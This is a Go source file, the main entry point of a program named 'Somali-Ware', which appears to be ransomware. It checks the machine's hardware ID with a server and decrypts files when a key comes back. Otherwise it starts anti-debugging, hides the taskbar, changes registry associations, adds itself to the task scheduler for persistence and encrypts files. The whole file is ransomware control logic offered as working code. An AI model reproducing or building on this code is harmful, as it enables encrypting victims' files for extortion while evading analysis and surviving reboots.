package main

import (
	"Somali-Ware/crypt/decryption"
	"Somali-Ware/crypt/encryption"
	"Somali-Ware/modules/annoying/persistance"
	"Somali-Ware/modules/annoying/taskbar"
	"Somali-Ware/modules/anti"
	"Somali-Ware/modules/assoc"
	"Somali-Ware/modules/system"
	"Somali-Ware/server"
	"Somali-Ware/settings"
	"encoding/base64"
	"fmt"
)

func main() {
	fmt.Println("Starting Somali-Ware")

	hwid := base64.StdEncoding.EncodeToString([]byte(system.GetHWID()))

	key, err := server.CheckAginstHWID(hwid)
	if err != nil {
		fmt.Println(err.Error())
		fmt.Scanln()
		return
	}

	switch key {
	case "":
		fmt.Println("Invalid HWID")
		fmt.Scanln()
		return
	case "not allowed":
		fmt.Println("SERVER HAS NOT WHITE LISTED THIS HWID")
		fmt.Scanln()
		return
	case "NEW USER":
		fmt.Println("NEW USER")
	default:
		settings.Key, err = base64.StdEncoding.DecodeString(key)
		if err != nil {
			fmt.Println("Failed to decode key:", err)
			fmt.Scanln()
			return
		}
		decryption.StartDecryption()
		return
	}

	if !settings.Bypass {
		go anti.AntiDebug()
	}

	if !settings.Testing {
		go taskbar.HideTaskBar()
	}

	err = server.GenerateKey()
	if err != nil {
		fmt.Println(err)
		return
	}

	if !settings.Testing {
		go assoc.ChangeRegKeys()
		go persistance.AddToTaskScheduler()
	}

	encryption.StartEncryption()
}
